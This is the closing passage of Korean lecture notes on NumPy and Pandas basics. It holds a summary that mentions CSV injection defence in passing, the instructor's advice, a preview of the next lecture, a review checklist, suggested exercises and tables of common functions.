📌 **노트**: 강사님께서는 "**내일은 이런 걸 배울 거예요**"라고 하시며, 앞으로 Matplotlib, Seaborn, Folium 등 더 다양한 시각화 도구를 학습할 것임을 예고하셨습니다.

---

## 💡 Section 7: 오늘 강의의 핵심 요약 및 다음 단계

### 7.1 오늘 배운 핵심 내용

오늘 강의에서는 다음과 같은 내용을 학습했습니다:

1. **NumPy 복습**
   - `np.loadtxt()`로 CSV 파일 로드
   - 배열 인덱싱, 슬라이싱, 타입 변환
   - `np.argmax()`, `np.argmin()`으로 극값 인덱스 찾기
   - 통계 함수 활용

2. **Pandas Series**
   - Series의 필요성과 특징
   - 다양한 생성 방법 (리스트, 딕셔너리, 데이터+인덱스)
   - 정수 인덱싱 vs 레이블 인덱싱
   - 멀티 인덱싱과 슬라이싱
   - 결측값(NaN) 처리: `isnull()`, `fillna()`, `dropna()`

3. **Pandas DataFrame**
   - DataFrame의 필요성과 구조
   - 다양한 생성 방법 (딕셔너리, 2차원 배열)
   - 열 이름 변경, 열 추가/삭제
   - DataFrame의 행과 열 접근

4. **보안 (CSV Injection)**
   - CSV Injection 공격의 위험성
   - 방어 기법: 입력값 검증 및 안전 처리

5. **복합 예제**
   - 웹 API에서 데이터 로드
   - 중첩 JSON 평탄화
   - 그룹화 및 집계 (`groupby()`)
   - AI 연동 시뮬레이션

6. **시각화 맛보기**
   - Matplotlib 기초
   - 막대 그래프 생성

---

### 7.2 강사님의 당부 말씀

강의 중 강사님께서 여러 번 강조하신 내용들을 정리하면:

> "**타입을 모르면 아무것도 할 수 없습니다.**"

데이터의 타입, 구조, 형상을 정확히 이해하는 것이 데이터 분석의 시작입니다.

> "**다른 사람의 코드를 보고 상대적 박탈감을 느낄 필요 없습니다. 자신의 속도에 맞춰 묵묵히 걸어가세요.**"

학습 속도는 사람마다 다릅니다. 자신의 페이스를 유지하는 것이 중요합니다.

> "**기본기가 가장 중요합니다. 화려한 것보다 기본기를 탄탄히 다지세요.**"

고급 기법은 기본기 위에 쌓이는 것입니다. 기본을 소홀히 하지 마세요.

> "**도메인 전문 지식이 있다면 데이터 분석은 그리 어렵지 않습니다.**"

보안 데이터든, 금융 데이터든, 의료 데이터든, 분석 기법은 동일합니다. 중요한 것은 **해당 분야에 대한 이해**입니다.

---

### 7.3 다음 강의 예고

강사님께서 예고하신 내용:

- **DataFrame 심화**: 더 복잡한 DataFrame 조작 기법
- **데이터 분석 기법**: 기술적 통계 분석, 탐색적 데이터 분석(EDA)
- **시각화 본격 학습**: Matplotlib, Seaborn, Folium
- **Streamlit**: 웹 기반 시각화 및 대시보드 구축
- **VS Code 환경 설정**: 터미널 기반 개발 환경 구축
- **Git 설치**: 버전 관리 도구 사용

📌 **노트**: 강사님께서는 "**VS Code가 없으시면 설치해주시고, Git도 설치해주세요**"라고 당부하셨습니다. 앞으로의 실습에서 필요합니다.

---

## 🎓 학습 정리 및 복습 가이드

### 오늘 배운 내용 복습 체크리스트

오늘 학습한 내용을 다음 질문들로 점검해보세요:

**NumPy 관련:**
- [ ] `np.loadtxt()`의 주요 파라미터(`dtype`, `skiprows`, `delimiter`)를 설명할 수 있나요?
- [ ] 2차원 배열에서 특정 열을 추출하는 방법을 알고 있나요?
- [ ] `astype()`을 사용하여 데이터 타입을 변환할 수 있나요?
- [ ] `np.argmax()`와 `np.argmin()`의 차이를 이해하고 있나요?

**Pandas Series 관련:**
- [ ] Series가 NumPy 배열과 다른 점을 설명할 수 있나요?
- [ ] 딕셔너리로 Series를 생성할 수 있나요?
- [ ] 정수 인덱싱과 레이블 인덱싱의 차이를 알고 있나요?
- [ ] 정수 슬라이싱과 레이블 슬라이싱의 차이(끝 인덱스 포함 여부)를 이해하고 있나요?
- [ ] `isnull()`, `fillna()`, `dropna()`를 사용하여 결측값을 처리할 수 있나요?

**Pandas DataFrame 관련:**
- [ ] DataFrame을 딕셔너리와 2차원 배열로 각각 생성할 수 있나요?
- [ ] DataFrame에 열을 추가하고 삭제할 수 있나요?
- [ ] `rename()` 메서드로 열 이름을 변경할 수 있나요?

**보안 관련:**
- [ ] CSV Injection 공격이 무엇인지 설명할 수 있나요?
- [ ] 입력값을 안전하게 처리하는 방법을 알고 있나요?

**데이터 분석 관련:**
- [ ] 중첩된 JSON 데이터를 평탄화하여 DataFrame으로 만들 수 있나요?
- [ ] `groupby()` 메서드로 데이터를 그룹화하고 집계할 수 있나요?
- [ ] Matplotlib으로 간단한 막대 그래프를 그릴 수 있나요?

---

### 실습 과제 제안

강사님께서 직접 과제를 내주지는 않으셨지만, 복습을 위해 다음 실습을 추천합니다:

**과제 1: 기후 데이터 추가 분석**
- 평균 기온이 20℃ 이상인 날들의 데이터만 추출하기
- 연도별 평균 최고 기온 계산하기 (힌트: 날짜 문자열에서 연도 추출)
- 월별 평균 기온의 변화 추이 그래프 그리기

**과제 2: 쇼핑 데이터 추가 분석**
- 제품 가격대별(저가, 중가, 고가) 판매 수량 분석
- 사용자당 평균 제품 구매 개수 계산
- 가장 비싼 제품 Top 5와 가장 저렴한 제품 Bottom 5 찾기

**과제 3: 자신만의 데이터셋 만들기**
- 자신의 관심사(취미, 업무, 학습 등)와 관련된 데이터를 딕셔너리로 만들기
- 이를 DataFrame으로 변환하고 간단한 분석 수행하기
- 결과를 그래프로 시각화하기

---

## 🔚 마무리

오늘은 NumPy를 복습하고 Pandas의 기초인 Series와 DataFrame을 학습했습니다. 강사님께서는 "**오늘도 고생한 본인을 위해서 '고생했어'라는 의미로 마무리하겠습니다**"라고 하시며 강의를 마치셨습니다.

데이터 분석의 여정은 이제 막 시작되었습니다. **기본기를 탄탄히 다지고, 꾸준히 실습하며, 자신의 페이스를 유지**한다면 반드시 원하는 목표에 도달할 수 있습니다.

**내일 강의에서 또 만나요!** 🚀

---

## 📎 부록: 주요 함수 및 메서드 참고표

### NumPy 주요 함수

| 함수 | 설명 | 사용 예시 |
|------|------|----------|
| `np.loadtxt()` | 텍스트/CSV 파일 로드 | `np.loadtxt('file.csv', delimiter=',')` |
| `np.savetxt()` | 배열을 텍스트 파일로 저장 | `np.savetxt('output.csv', arr, delimiter=',')` |
| `np.max()` | 최댓값 찾기 | `np.max(arr)` |
| `np.min()` | 최솟값 찾기 | `np.min(arr)` |
| `np.mean()` | 평균 계산 | `np.mean(arr)` |
| `np.argmax()` | 최댓값의 인덱스 찾기 | `np.argmax(arr)` |
| `np.argmin()` | 최솟값의 인덱스 찾기 | `np.argmin(arr)` |
| `np.argsort()` | 정렬 후 인덱스 배열 반환 | `np.argsort(arr)` |
| `arr.astype()` | 데이터 타입 변환 | `arr.astype(float)` |

### Pandas Series 주요 메서드

| 메서드/함수 | 설명 | 사용 예시 |
|------------|------|----------|
| `pd.Series()` | Series 생성 | `pd.Series([1,2,3], index=['a','b','c'])` |
| `pd.isnull()` | 결측값 확인 (True/False) | `pd.isnull(series)` |
| `pd.notnull()` | 결측값이 아닌지 확인 | `pd.notnull(series)` |
| `series.fillna()` | 결측값 채우기 | `series.fillna(0)` |
| `series.dropna()` | 결측값 제거 | `series.dropna()` |
| `series.head()` | 처음 n개 요소 | `series.head(5)` |
| `series.tail()` | 마지막 n개 요소 | `series.tail(5)` |

### Pandas DataFrame 주요 메서드

| 메서드 | 설명 | 사용 예시 |
|--------|------|----------|
| `pd.DataFrame()` | DataFrame 생성 | `pd.DataFrame({'A': [1,2], 'B': [3,4]})` |
| `df.head()` | 처음 n개 행 | `df.head(10)` |
| `df.tail()` | 마지막 n개 행 | `df.tail(10)` |
| `df.shape` | 행/열 개수 | `df.shape` |
| `df.columns` | 열 이름 리스트 | `df.columns` |
| `df.index` | 행 인덱스 | `df.index` |
| `df.rename()` | 열/행 이름 변경 | `df.rename(columns={'old':'new'})` |
| `df.groupby()` | 그룹화 | `df.groupby('column')` |
| `df.to_csv()` | CSV 파일로 저장 | `df.to_csv('output.csv')` |
| `pd.read_csv()` | CSV 파일 로드 | `pd.read_csv('file.csv')` |

---

**끝.**
